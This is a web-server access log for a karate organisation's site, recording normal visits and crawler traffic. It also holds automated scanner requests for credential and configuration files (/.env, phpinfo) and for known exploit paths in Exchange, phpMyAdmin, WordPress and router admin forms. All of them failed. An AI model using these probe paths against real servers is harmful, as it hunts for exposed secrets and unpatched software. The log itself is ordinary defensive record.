::ffff:51.89.5.185 - - [29/Jan/2023:12:18:46 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [29/Jan/2023:12:18:47 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.56.108.128 - - [29/Jan/2023:12:27:10 +0000] "GET /systembc/password.php HTTP/1.0" 404 160 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:74.82.47.5 - - [29/Jan/2023:12:28:22 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:183.136.225.32 - - [29/Jan/2023:12:38:38 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:135.125.246.110 - - [29/Jan/2023:12:38:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:12:38:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:138.197.170.20 - - [29/Jan/2023:12:42:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
::ffff:49.228.102.218 - - [29/Jan/2023:12:42:35 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
::ffff:74.82.47.5 - - [29/Jan/2023:12:42:38 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:49.228.102.218 - - [29/Jan/2023:12:42:39 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
::ffff:183.136.225.32 - - [29/Jan/2023:12:44:14 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [29/Jan/2023:12:44:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [29/Jan/2023:12:44:15 +0000] "GET /ie7/ie7-standard-p.js HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [29/Jan/2023:12:45:13 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:171.97.168.83 - - [29/Jan/2023:12:54:46 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "https://www.google.com/url?q=http://wadokikai.org/docs/Bushido-code.pdf&sa=U&ved=2ahUKEwiPro-66ez8AhU91TgGHdvuBvQQFnoECCEQAQ&usg=AOvVaw364j0UavKGSw9eQx7Fu1SJ" "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/248.1.504392274 Mobile/15E148 Safari/604.1"
::ffff:101.32.209.199 - - [29/Jan/2023:12:59:07 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:80.85.241.15 - - [29/Jan/2023:13:05:26 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3880.4 Safari/537.36"
::ffff:40.77.167.20 - - [29/Jan/2023:13:08:09 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:104.248.151.149 - - [29/Jan/2023:13:32:29 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0"
::ffff:104.248.151.149 - - [29/Jan/2023:13:32:29 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0"
::ffff:51.89.5.185 - - [29/Jan/2023:13:35:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [29/Jan/2023:13:35:26 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:134.122.184.20 - - [29/Jan/2023:14:00:35 +0000] "GET /?s=home-vod-read-id-41080.html HTTP/1.1" 200 57378 "/?s=home-vod-read-id-41080.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:52.42.94.111 - - [29/Jan/2023:14:18:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:52.33.213.90 - - [29/Jan/2023:14:20:31 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.215.172.194 - - [29/Jan/2023:14:20:44 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.215.172.194 - - [29/Jan/2023:14:20:45 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:54.189.196.35 - - [29/Jan/2023:14:24:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:54.189.196.35 - - [29/Jan/2023:14:24:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:14:29:29 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:14:29:30 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:128.14.141.34 - - [29/Jan/2023:14:31:21 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:107.170.246.28 - - [29/Jan/2023:14:39:59 +0000] "GET /version HTTP/1.1" 404 146 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:101.99.90.175 - - [29/Jan/2023:15:09:34 +0000] "GET /wp-login.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
::ffff:20.199.8.196 - - [29/Jan/2023:15:29:55 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.199.8.196 - - [29/Jan/2023:15:29:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.199.8.196 - - [29/Jan/2023:15:29:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.199.8.196 - - [29/Jan/2023:15:29:57 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.191.45.212 - - [29/Jan/2023:15:32:05 +0000] "GET / HTTP/1.1" 200 57378 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:20.191.45.212 - - [29/Jan/2023:15:32:05 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:128.14.209.170 - - [29/Jan/2023:15:46:42 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:40.77.167.20 - - [29/Jan/2023:16:01:55 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:167.249.90.101 - - [29/Jan/2023:16:19:40 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:185.224.128.219 - - [29/Jan/2023:16:26:36 +0000] "GET /_asterisk/ HTTP/1.1" 404 149 "-" "python-requests/2.22.0"
::ffff:51.89.5.185 - - [29/Jan/2023:16:33:44 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [29/Jan/2023:16:33:45 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:16:45:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:16:45:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:198.199.105.127 - - [29/Jan/2023:16:47:09 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 169 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:49.156.46.91 - - [29/Jan/2023:16:59:08 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:185.224.128.219 - - [29/Jan/2023:17:01:42 +0000] "GET /admin/config.php HTTP/1.1" 404 155 "-" "python-requests/2.22.0"
::ffff:207.46.13.104 - - [29/Jan/2023:17:09:23 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.20 - - [29/Jan/2023:17:09:40 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.47 - - [29/Jan/2023:17:09:45 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:34.76.158.233 - - [29/Jan/2023:17:12:19 +0000] "GET / HTTP/1.1" 200 57378 "-" "python-requests/2.28.2"
::ffff:114.119.128.85 - - [29/Jan/2023:17:27:47 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.141.53 - - [29/Jan/2023:17:49:16 +0000] "GET /contact HTTP/1.1" 200 10017 "https://wadokikai.org/contact?s=1&ss=9" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:20 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:20 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:22 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:23 +0000] "GET / HTTP/1.1" 200 57378 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:24 +0000] "GET /events HTTP/1.1" 200 5867 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:27 +0000] "GET /resources HTTP/1.1" 200 194907 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:27 +0000] "GET /schools HTTP/1.1" 200 97308 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:28 +0000] "GET /contact HTTP/1.1" 200 10017 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:29 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:31 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:32 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:33 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:34 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:35 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:36 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:37 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:38 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:39 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:40 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.21.74.6 - - [29/Jan/2023:17:51:41 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:135.125.246.110 - - [29/Jan/2023:17:52:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:17:52:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:17:57:31 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:17:57:31 +0000] "POST /.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [29/Jan/2023:17:59:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [29/Jan/2023:17:59:34 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.79.83.160 - - [29/Jan/2023:18:02:24 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:45.79.83.160 - - [29/Jan/2023:18:02:24 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:45.79.83.160 - - [29/Jan/2023:18:02:24 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:45.79.83.160 - - [29/Jan/2023:18:02:25 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:45.79.83.160 - - [29/Jan/2023:18:02:26 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://34.212.47.6/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:114.119.138.127 - - [29/Jan/2023:18:17:57 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:18.207.159.18 - - [29/Jan/2023:18:18:51 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:18:18:51 +0000] "POST /.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:192.241.232.31 - - [29/Jan/2023:18:31:56 +0000] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 158 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:18.207.159.18 - - [29/Jan/2023:18:49:22 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:18:49:22 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:167.172.49.49 - - [29/Jan/2023:18:52:07 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:185.191.171.8 - - [29/Jan/2023:18:56:44 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.6 - - [29/Jan/2023:18:56:45 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.10 - - [29/Jan/2023:18:58:56 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:18.207.159.18 - - [29/Jan/2023:18:59:30 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:18:59:30 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [29/Jan/2023:19:01:11 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [29/Jan/2023:19:01:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:19:10:08 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:19:10:08 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.191.171.22 - - [29/Jan/2023:19:13:38 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:205.210.31.134 - - [29/Jan/2023:19:16:11 +0000] "GET / HTTP/1.1" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:93.158.161.41 - - [29/Jan/2023:19:17:06 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:93.158.161.41 - - [29/Jan/2023:19:17:09 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; YandexFavicons/1.0; +http://yandex.com/bots)"
::ffff:40.77.167.32 - - [29/Jan/2023:19:23:38 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:207.46.13.104 - - [29/Jan/2023:19:23:46 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:136.49.58.152 - - [29/Jan/2023:19:33:00 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:19:35:07 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:19:35:07 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:19:56:19 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
